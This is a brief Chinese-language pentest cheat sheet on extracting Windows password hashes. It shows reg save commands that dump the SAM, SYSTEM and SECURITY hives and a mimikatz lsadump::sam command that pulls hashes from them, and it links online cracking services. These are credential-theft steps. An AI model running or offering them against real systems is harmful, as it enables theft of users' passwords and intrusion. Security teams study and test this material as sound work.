# Windows Hash提取

## 0x00 基础知识

- LM Hash Windows Vista和Windows Server 2008以前的系统还会使用
- NTLM Hash
- Net-NTLM Hash 网络环境下NTLM认证中的hash

[Windows下的密码hash——NTLM hash和Net-NTLM hash介绍](https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D)
## 0x01 离线获取Hash

### 1.注册表导出文件
```
reg save HKLM\SYSTEM system.hive
reg save HKLM\SAM sam.hive
reg save hklm\security security.hive
```
### 2. 通过mimikatz导出Hash

```
$ ./mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::sam /sam:sam.hive /system:system.hive
```

### 3. 破解Hash获取明文密码
 
 见0x03 破解 Hash 
## 0x02 在线获取Hash

## 0x03 破解 Hash 
>强力推荐
- [Ophcrack 在线破解](https://www.objectif-securite.ch/en/ophcrack)

- [Cmd5在线破解](https://www.cmd5.com/)

## Ref

- https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D 